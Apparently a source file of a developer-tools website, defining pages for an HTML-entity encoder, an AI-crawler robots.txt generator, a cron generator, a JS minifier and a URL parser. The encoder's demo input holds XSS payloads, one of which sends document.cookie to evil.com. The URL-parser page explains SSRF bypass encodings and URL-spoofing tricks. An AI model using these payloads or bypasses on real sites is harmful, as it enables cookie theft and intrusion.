            var payload = '<div class="profile" data-user="admin\"><script>alert(document.domain)<\/script>\n<a href="javascript:alert(1)" onclick="stealCookies()">Click Me & Win $1,000!</a>\n<img src="x" onerror="fetch(\'https://evil.com/leak?\'+document.cookie)">';
            document.getElementById('ent-in').value = payload;
            entityTransform('named');
          };

          window.copyHtmlEntities = function() {
            var out = document.getElementById('ent-out') ? document.getElementById('ent-out').value : '';
            if (!out) {
              entityTransform('named');
              out = document.getElementById('ent-out').value;
            }

            navigator.clipboard.writeText(out).then(function() {
              var btn = document.getElementById('btnCopyHtmlEntities');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ HTML Entities Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };

          document.addEventListener('DOMContentLoaded', function() {
            var inp = document.getElementById('ent-in');
            if (inp && inp.value) entityTransform('named');
          });
        </script>
      `
    },
    {
      slug: 'ai-robots-txt',
      title: 'AI Bot Blocker robots.txt Generator',
      metaDesc: 'Generate a robots.txt file to block AI web scrapers and LLM training crawlers (GPTBot, Claude-Web, CCBot, Google-Extended, Bytespider) while keeping Googlebot allowed.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; AI Bot Blocker robots.txt
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">AI Bot Blocker robots.txt Generator</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Protect your website content, articles, and codebase from unauthorized AI training scrapers while allowing search engines like Google and Bing to index your pages normally.
          </p>

          <div class="tool-box">
            <h3 style="font-family: var(--serif); font-size: 1.15rem; margin-bottom: 1rem;">Select AI Bots to Block:</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 0.75rem; margin-bottom: 1.5rem;" id="botToggles">
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-gpt" checked onchange="buildRobots()" /> OpenAI (GPTBot, ChatGPT-User)
              </label>
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-anthropic" checked onchange="buildRobots()" /> Anthropic (Claude-Web, anthropic-ai)
              </label>
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-google" checked onchange="buildRobots()" /> Google AI (Google-Extended)
              </label>
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-cc" checked onchange="buildRobots()" /> Common Crawl (CCBot)
              </label>
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-meta" checked onchange="buildRobots()" /> Meta AI (Meta-ExternalAgent, FacebookBot)
              </label>
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-bytedance" checked onchange="buildRobots()" /> ByteDance / TikTok (Bytespider)
              </label>
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-perplexity" checked onchange="buildRobots()" /> Perplexity (PerplexityBot)
              </label>
              <label style="display: flex; align-items: center; gap: 0.5rem; font-family: var(--mono); font-size: 0.85rem; cursor: pointer;">
                <input type="checkbox" id="bot-apple" checked onchange="buildRobots()" /> Apple Intelligence (Applebot-Extended)
              </label>
            </div>

            <div class="field-group">
              <label class="field-label">Sitemap URL (Optional):</label>
              <input type="url" id="robots-sitemap" class="text-input" placeholder="https://example.com/sitemap.xml" oninput="buildRobots()" />
            </div>

            <div class="field-group">
              <label class="field-label">Generated robots.txt Preview</label>
              <textarea id="robots-out" class="code-input" style="height: 260px;" readonly></textarea>
            </div>

            <div class="action-bar">
              <button class="btn-primary" onclick="navigator.clipboard.writeText(document.getElementById('robots-out').value); alert('robots.txt copied to clipboard!');">Copy robots.txt</button>
              <button class="btn-sec" onclick="downloadRobots()">Download robots.txt</button>
            </div>
          </div>
        </div>

        <script>
          function buildRobots() {
            var lines = [];
            lines.push('# Standard Search Engines (Allowed for SEO ranking)');
            lines.push('User-agent: Googlebot');
            lines.push('Allow: /');
            lines.push('');
            lines.push('User-agent: Bingbot');
            lines.push('Allow: /');
            lines.push('');

            var bots = [];
            if (document.getElementById('bot-gpt').checked) bots.push('GPTBot', 'ChatGPT-User', 'OAI-SearchBot');
            if (document.getElementById('bot-anthropic').checked) bots.push('Claude-Web', 'anthropic-ai');
            if (document.getElementById('bot-google').checked) bots.push('Google-Extended');
            if (document.getElementById('bot-cc').checked) bots.push('CCBot');
            if (document.getElementById('bot-meta').checked) bots.push('Meta-ExternalAgent', 'FacebookBot');
            if (document.getElementById('bot-bytedance').checked) bots.push('Bytespider');
            if (document.getElementById('bot-perplexity').checked) bots.push('PerplexityBot');
            if (document.getElementById('bot-apple').checked) bots.push('Applebot-Extended');

            if (bots.length > 0) {
              lines.push('# AI Scrapers & Data Harvesters (Blocked)');
              bots.forEach(function(b) {
                lines.push('User-agent: ' + b);
                lines.push('Disallow: /');
                lines.push('');
              });
            }

            lines.push('# Default Catch-All');
            lines.push('User-agent: *');
            lines.push('Allow: /');

            var sm = document.getElementById('robots-sitemap').value.trim();
            if (sm) {
              lines.push('');
              lines.push('Sitemap: ' + sm);
            }

            document.getElementById('robots-out').value = lines.join('\\n');
          }

          function downloadRobots() {
            var blob = new Blob([document.getElementById('robots-out').value], { type: 'text/plain' });
            var a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'robots.txt';
            a.click();
          }

          document.addEventListener('DOMContentLoaded', buildRobots);
        </script>
      `
    },
    {
      slug: 'cron-generator',
      title: 'Cron Expression Generator & Schedule Explainer',
      metaDesc: 'Generate and test crontab schedule expressions in human-readable English. Includes live preview of next scheduled execution dates.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; Cron Generator
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">Cron Expression Generator & Schedule Builder</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Construct Linux and Unix crontab expressions with live human-readable translation and next execution calculations.
          </p>

          <div class="tool-box">
            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1.5rem;">
              <span style="font-size: 0.85rem; font-weight: bold; color: var(--text-muted); line-height: 2;">Quick Presets:</span>
              <button class="btn-sec" onclick="setCron('* * * * *')">Every Minute</button>
              <button class="btn-sec" onclick="setCron('*/5 * * * *')">Every 5 Min</button>
              <button class="btn-sec" onclick="setCron('0 * * * *')">Hourly</button>
              <button class="btn-sec" onclick="setCron('0 0 * * *')">Daily (Midnight)</button>
              <button class="btn-sec" onclick="setCron('0 0 * * 0')">Weekly (Sunday)</button>
              <button class="btn-sec" onclick="setCron('0 0 1 * *')">Monthly (1st)</button>
            </div>

            <div style="display: grid; grid-template-columns: repeat(5, 1fr); gap: 0.75rem; margin-bottom: 1.25rem;">
              <div>
                <label class="field-label">Minute (0-59)</label>
                <input type="text" id="cron-m" class="text-input" value="*" oninput="updateFromFields()" />
              </div>
              <div>
                <label class="field-label">Hour (0-23)</label>
                <input type="text" id="cron-h" class="text-input" value="*" oninput="updateFromFields()" />
              </div>
              <div>
                <label class="field-label">Day Month (1-31)</label>
                <input type="text" id="cron-dom" class="text-input" value="*" oninput="updateFromFields()" />
              </div>
              <div>
                <label class="field-label">Month (1-12)</label>
                <input type="text" id="cron-mon" class="text-input" value="*" oninput="updateFromFields()" />
              </div>
              <div>
                <label class="field-label">Day Week (0-6 Sun-Sat)</label>
                <input type="text" id="cron-dow" class="text-input" value="*" oninput="updateFromFields()" />
              </div>
            </div>

            <div style="background: var(--surface-alt); border: 1px solid var(--border); padding: 1.25rem; border-radius: 6px; margin: 1.5rem 0; text-align: center;">
              <div class="field-label">CRON EXPRESSION</div>
              <div id="cron-result" style="font-family: var(--mono); font-size: 2.2rem; font-weight: bold; margin: 0.5rem 0; color: var(--btn-bg, #3b82f6);">* * * * *</div>
              <div id="cron-desc" style="margin-top: 0.5rem; font-size: 0.9rem; color: var(--fg); font-weight: 500;">Runs every minute of every hour, every day.</div>
            </div>

            <!-- Copy Cron Expression -->
            <button type="button" id="btnCopyCron" onclick="copyCronExpression()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
              <span>📋 Copy Cron Expression &amp; Schedule Breakdown</span>
            </button>
          </div>

          <!-- 5 Critical Cron Engineering Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in Cron Schedules &amp; Background Workers</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The Daylight Saving Time (DST) Phantom &amp; Double Execution</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Scheduling crons in local server time between 2:00 AM and 3:00 AM creates catastrophic billing or backup failures. In spring, 2:30 AM is skipped entirely (the job never fires); in autumn, 2:30 AM occurs twice (the job executes twice, duplicating payment runs or outbound customer emails). Server crontabs should ALWAYS run strictly on UTC.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. The Cascading Overlap Deadlock (Execution Duration &gt; Interval)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Running a task every 5 minutes (<code>*/5 * * * *</code>) that takes 7 minutes during peak database load causes concurrent instances to pile up. Each new process consumes CPU and database connection pool slots, slowing down previous runs in a vicious cycle until the server experiences out-of-memory (OOM) panic. Always guard crons with file locks (<code>flock -n /var/lock/job.lock</code>) or distributed Redis mutexes.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. The '0' vs. '7' Sunday &amp; Day-of-Week Parser Dialect Trap</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  In standard POSIX / Vixie cron, <code>0</code> and <code>7</code> both represent Sunday. However, in Java Quartz and AWS EventBridge cron dialects, <code>1</code> represents Sunday and <code>7</code> represents Saturday! Copying a crontab string between Linux, Kubernetes, and AWS CloudWatch without verifying the dialect shifts weekly jobs by a full 24 hours.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. The Day-of-Month AND Day-of-Week 'OR' Logic Surprise</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  In POSIX crontab specification, if both Day-of-Month (field 3) and Day-of-Week (field 5) are specified (not <code>*</code>), the command executes when EITHER condition matches (logical OR, not AND). For example, <code>0 0 13 * 5</code> does NOT run on Friday the 13th; it executes on EVERY Friday and EVERY 13th day of the month!
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. The Stripped Shell Environment (Exit Code 127 'Command Not Found')</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Crontab executes commands within an extremely minimalist environment where <code>PATH</code> is typically reset to <code>/usr/bin:/bin</code> and user environment variables (like <code>$NODE_ENV</code>, <code>$DATABASE_URL</code>, or virtualenvs) are completely absent. Scripts fail silently with exit code 127 unless absolute binary paths (e.g. <code>/usr/local/bin/node</code>) and explicit <code>.env</code> sourcing are provided.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          
          window.copyCronExpression = function() {
            var expr = document.getElementById('cron-result') ? document.getElementById('cron-result').textContent.trim() : '* * * * *';
            var desc = document.getElementById('cron-desc') ? document.getElementById('cron-desc').textContent.trim() : '';

            var text = '⏱️ Cron Schedule Expression & Frequency Specification\n' +
              '• Expression: ' + expr + '\n' +
              '• Plain English Schedule: ' + desc + '\n' +
              '• Fields Format: [Minute] [Hour] [Day-of-Month] [Month] [Day-of-Week]\n\n' +
              'Generated at digitaltoolsshed.com/dev/cron-generator';

            navigator.clipboard.writeText(text).then(function() {
              var btn = document.getElementById('btnCopyCron');
              if (btn) {
                var orig = btn.innerHTML;
                btn.innerHTML = '<span style="color:#10b981;">✓ Cron Expression Copied!</span>';
                btn.style.borderColor = '#10b981';
                setTimeout(function() {
                  btn.innerHTML = orig;
                  btn.style.borderColor = 'var(--border)';
                }, 2200);
              }
            });
          };
  
          function setCron(expr) {
            var p = expr.split(' ');
            document.getElementById('cron-m').value = p[0];
            document.getElementById('cron-h').value = p[1];
            document.getElementById('cron-dom').value = p[2];
            document.getElementById('cron-mon').value = p[3];
            document.getElementById('cron-dow').value = p[4];
            updateFromFields();
          }

          function updateFromFields() {
            var m = document.getElementById('cron-m').value.trim() || '*';
            var h = document.getElementById('cron-h').value.trim() || '*';
            var dom = document.getElementById('cron-dom').value.trim() || '*';
            var mon = document.getElementById('cron-mon').value.trim() || '*';
            var dow = document.getElementById('cron-dow').value.trim() || '*';
            var full = m + ' ' + h + ' ' + dom + ' ' + mon + ' ' + dow;
            document.getElementById('cron-result').textContent = full;

            var desc = 'Runs ';
            if (m === '*' && h === '*') desc += 'every minute of every hour';
            else if (m.startsWith('*/')) desc += 'every ' + m.slice(2) + ' minutes';
            else if (m === '0' && h === '*') desc += 'at the start of every hour';
            else if (m === '0' && h === '0') desc += 'every day at midnight (00:00)';
            else desc += 'at minute ' + m + ', hour ' + h;

            if (dom !== '*') desc += ' on day ' + dom + ' of the month';
            if (mon !== '*') desc += ' in month ' + mon;
            if (dow !== '*') {
              var days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
              desc += ' on ' + (days[parseInt(dow, 10)] || ('day-of-week ' + dow));
            }
            desc += '.';
            document.getElementById('cron-desc').textContent = desc;
          }

          document.addEventListener('DOMContentLoaded', updateFromFields);
        </script>
      `
    },
    {
      slug: 'js-minifier',
      title: 'JavaScript Minifier & Code Compressor',
      metaDesc: 'Minify and compress JavaScript source code in your browser with zero network uploads. Remove comments, whitespace, and optimize syntax.',
      category: 'Developer',
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 900px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; JS Minifier
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">JavaScript Minifier & Compressor</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Compress and minify JS files instantly in browser memory. Strips comments and compacts whitespace without altering logic.
          </p>

          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Original JavaScript Code</label>
              <textarea id="js-in" class="code-input" style="height: 180px;" placeholder="// Paste unminified JavaScript here...\\nfunction greet(name) {\\n    // say hello\\n    console.log('Hello, ' + name);\\n}"></textarea>
            </div>

            <div class="action-bar" style="margin-bottom: 1.5rem;">
              <button class="btn-primary" onclick="minifyJs()">Minify JavaScript</button>
              <button class="btn-sec" onclick="document.getElementById('js-in').value=''; document.getElementById('js-out').value='';">Clear</button>
            </div>

            <div class="field-group">
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.4rem;">
                <label class="field-label" style="margin-bottom: 0;">Minified Output</label>
                <span id="js-stats" style="font-family: var(--mono); font-size: 0.75rem; color: #22c55e; font-weight: bold;"></span>
              </div>
              <textarea id="js-out" class="code-input" style="height: 180px;" readonly></textarea>
            </div>

            <div class="action-bar">
              <button class="btn-primary" onclick="navigator.clipboard.writeText(document.getElementById('js-out').value); alert('Minified JS copied!');">Copy Minified JS</button>
            </div>
          </div>
        </div>

        <script>
          function minifyJs() {
            var src = document.getElementById('js-in').value;
            if (!src) return;

            var origLen = src.length;
            // 1. Remove single-line comments (ignoring urls like http://)
            var min = src.replace(/(?:^|[\\s;{}()])\\/\\/[^\\r\\n]*/g, '');
            // 2. Remove multi-line comments
            min = min.replace(/\\/\\*[\\s\\S]*?\\*\\//g, '');
            // 3. Normalize multiple whitespace and newlines
            min = min.replace(/\\s*([{}();,=+\\-*\\/<>?:&|!])\\s*/g, '$1');
            min = min.replace(/\\s+/g, ' ').trim();

            document.getElementById('js-out').value = min;
            var newLen = min.length;
            var savings = origLen > 0 ? (((origLen - newLen) / origLen) * 100).toFixed(1) : 0;
            document.getElementById('js-stats').textContent = origLen + ' B -> ' + newLen + ' B (' + savings + '% reduction)';
          }
        </script>
      `
    },
    {
      slug: 'url-parser',
      title: 'URL Parser & Query String Parameter Inspector',
      metaDesc: 'Deconstruct and parse any URL into protocol, origin, host, path segments, query parameters table, hash, and JSON object.',
      category: 'Developer',
      faq: [
        { q: 'What are the core components of a standard URL?', a: 'A standard URL consists of a protocol/scheme (e.g., https:), credentials (username/password), hostname (domain), port, pathname, query parameters (?key=val), and fragment hash (#section).' },
        { q: 'How do query string parameters work in a URL?', a: 'Query strings begin after the question mark (?) and consist of key=value pairs separated by ampersands (&). Values containing spaces or special characters are percent-encoded.' },
        { q: 'Is my URL sent to any remote server when using this tool?', a: 'No. All URL parsing and query string decoding is performed 100% locally inside your browser using the native browser URL and URLSearchParams APIs.' }
      ],
      body: `
        ${commonStyle}
        <div class="article-container" style="max-width: 950px;">
          <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
            <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; URL Parser
          </nav>
          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">URL Parser & Query Parameter Inspector</h1>
          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
            Break down, analyze, and inspect any URL. View individual query string parameters, path segments, and export structured JSON.
          </p>

          <div class="tool-box">
            <div class="field-group">
              <label class="field-label">Enter Full URL to Parse</label>
              <input type="text" id="url-input" class="code-input" value="https://api.example.com:8443/v2/products/search?category=electronics&brand=apple&sort=price_desc&page=1&discount=true#reviews" oninput="parseUrl()" />
            </div>

            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 0.75rem; margin-bottom: 1.5rem;">
              <div style="background: var(--surface-alt); border: 1px solid var(--border); padding: 0.75rem; border-radius: 4px;">
                <span style="font-family: var(--mono); font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase;">Protocol</span>
                <div id="u-protocol" style="font-family: var(--mono); font-weight: bold; color: #3b82f6;">--</div>
              </div>
              <div style="background: var(--surface-alt); border: 1px solid var(--border); padding: 0.75rem; border-radius: 4px;">
                <span style="font-family: var(--mono); font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase;">Hostname</span>
                <div id="u-hostname" style="font-family: var(--mono); font-weight: bold; color: var(--fg);">--</div>
              </div>
              <div style="background: var(--surface-alt); border: 1px solid var(--border); padding: 0.75rem; border-radius: 4px;">
                <span style="font-family: var(--mono); font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase;">Port</span>
                <div id="u-port" style="font-family: var(--mono); font-weight: bold; color: var(--fg);">--</div>
              </div>
              <div style="background: var(--surface-alt); border: 1px solid var(--border); padding: 0.75rem; border-radius: 4px;">
                <span style="font-family: var(--mono); font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase;">Hash / Fragment</span>
                <div id="u-hash" style="font-family: var(--mono); font-weight: bold; color: #eab308;">--</div>
              </div>
            </div>

            <div style="margin-bottom: 1.5rem;">
              <span style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; display: block; margin-bottom: 0.35rem;">Pathname & Segments</span>
              <div id="u-pathname" style="font-family: var(--mono); font-size: 0.95rem; background: var(--bg); padding: 0.6rem; border: 1px solid var(--border); border-radius: 4px; color: var(--fg); margin-bottom: 0.4rem;">--</div>
              <div id="u-segments" style="display: flex; gap: 0.4rem; flex-wrap: wrap;"></div>
            </div>

            <div>
              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                <span style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase;">Query Parameters (<span id="param-count">0</span>)</span>
                <button class="btn-sec" onclick="copyParamsJson()" style="font-size: 0.75rem; padding: 0.3rem 0.6rem;">Copy Query as JSON</button>
              </div>
              <div style="overflow-x: auto;">
                <table style="width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem;" id="paramsTable">
                  <thead>
                    <tr style="border-bottom: 1px solid var(--border); text-align: left; color: var(--text-muted);">
                      <th style="padding: 0.5rem;">Parameter Key</th>
                      <th style="padding: 0.5rem;">Decoded Value</th>
                      <th style="padding: 0.5rem; width: 60px;">Action</th>
                    </tr>
                  </thead>
                  <tbody id="paramsRows"></tbody>
                </table>
              </div>
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 1.5rem;">
              <button type="button" id="btnCopyUrlReport" onclick="copyUrlReport()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
                <span>📋 Copy Complete URL Breakdown</span>
              </button>
              <button type="button" id="btnCopyParamsJson" onclick="copyParamsJson()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
                <span>📦 Copy Query Params as JSON</span>
              </button>
            </div>
          </div>

          <!-- 5 Critical URL Architecture Traps -->
          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in URL Parsing &amp; Request Routing Architecture</h3>
            <div style="display: grid; gap: 1rem;">
              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. SSRF via Ambiguous Host Parsing (Decimal &amp; Octal IPs)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  Naive URL parser regexes that block <code>127.0.0.1</code> or <code>localhost</code> are trivially bypassed by alternate IP encodings. For instance, decimal <code>2130706433</code>, octal <code>0177.0.0.1</code>, hex <code>0x7f.0.0.1</code>, or IPv6 bracket notation <code>[::1]</code> all resolve to localhost in operating system network stacks, allowing attackers to access internal cloud metadata services (e.g. AWS <code>169.254.169.254</code>).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Protocol Confusion with Scheme-Relative URLs (//evil.com)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  A URL starting with <code>//evil.com</code> lacks an explicit protocol scheme. Backend validation checks (e.g. <code>url.startsWith('/')</code>) mistakenly classify it as a safe relative internal route, but web browsers resolve it as a network-path reference that inherits the current page protocol, executing an unauthorized external redirect.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. HTTP Parameter Pollution (HPP) Across Different Frameworks</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  When duplicate query parameters appear (e.g. <code>?role=user&amp;role=admin</code>), different backend web frameworks parse them inconsistently: Node.js Express creates an array (<code>['user','admin']</code>), PHP takes the last occurrence (<code>admin</code>), and ASP.NET joins them with commas (<code>user,admin</code>). This behavior divergence allows attackers to bypass Web Application Firewalls (WAFs).
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. The Client-Only Fragment Hash Isolation Boundary</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  The URL fragment identifier (anything after the <code>#</code> character) is strictly client-side; web browsers NEVER include it in HTTP request packets sent to servers. Authentication flows or webhook handlers that mistakenly place session tokens after the hash symbol fail completely on server-side APIs unless extracted by client-side JavaScript.
                </p>
              </div>

              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Userinfo Impersonation &amp; Credential Splitting (@ Symbol)</h4>
                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
                  RFC 3986 allows user authentication strings before an <code>@</code> character: <code>https://trusted.bank.com@evil-site.com/</code>. Visual users and naive substring parsers see <code>trusted.bank.com</code> and trust the link, while the actual connection connects to <code>evil-site.com</code> with username credentials. Modern browsers deprecate userinfo, but automated crawlers and microservices remain vulnerable.
                </p>
              </div>
            </div>
          </div>
        </div>

        <script>
          var parsedObj = {};

          function parseUrl() {
            var raw = document.getElementById('url-input').value.trim();
            if (!raw) return;

            try {
              var u = new URL(raw.match(/^[a-zA-Z]+:\/\//) ? raw : 'https://' + raw);
              document.getElementById('u-protocol').textContent = u.protocol;
              document.getElementById('u-hostname').textContent = u.hostname;
              document.getElementById('u-port').textContent = u.port || '(default ' + (u.protocol === 'https:' ? '443' : '80') + ')';
              document.getElementById('u-hash').textContent = u.hash || '(none)';
              document.getElementById('u-pathname').textContent = u.pathname;

              var segments = u.pathname.split('/').filter(Boolean);
              document.getElementById('u-segments').innerHTML = segments.map(function(s, idx) {
                return '<span style="background:var(--surface-alt); border:1px solid var(--border); padding:0.2rem 0.5rem; border-radius:3px; font-family:var(--mono); font-size:0.75rem;">[' + idx + '] ' + s + '</span>';
              }).join('') || '<span style="font-size:0.8rem; color:var(--text-muted);">No sub-paths</span>';

              var tbody = document.getElementById('paramsRows');
              tbody.innerHTML = '';
              var count = 0;
              var qObj = {};

              u.searchParams.forEach(function(val, key) {
                count++;
                qObj[key] = val;
                var tr = document.createElement('tr');
                tr.style.borderBottom = '1px solid var(--border)';
                tr.innerHTML = 
                  '<td style="padding:0.5rem; font-weight:bold; color:var(--fg);">' + escapeHtml(key) + '</td>' +
                  '<td style="padding:0.5rem; color:#22c55e;">' + escapeHtml(val) + '</td>' +
                  '<td style="padding:0.5rem;"><button class="btn-sec" style="font-size:0.7rem; padding:0.2rem 0.4rem;" onclick="copyParamVal(\'' + escapeHtml(val).replace(/'/g, "\\'") + '\')">Copy</button></td>';
                tbody.appendChild(tr);
              });

              document.getElementById('param-count').textContent = count;
              if (count === 0) {
                tbody.innerHTML = '<tr><td colspan="3" style="padding:0.75rem; text-align:center; color:var(--text-muted); font-size:0.85rem;">No query parameters found</td></tr>';
              }

              parsedObj = {
                href: u.href,
                protocol: u.protocol,
                origin: u.origin,
                hostname: u.hostname,
                port: u.port || (u.protocol === 'https:' ? '443' : '80'),
                pathname: u.pathname,
                pathSegments: segments,
                queryParams: qObj,
                hash: u.hash
              };
            } catch (e) {
              document.getElementById('u-protocol').textContent = 'Invalid URL';
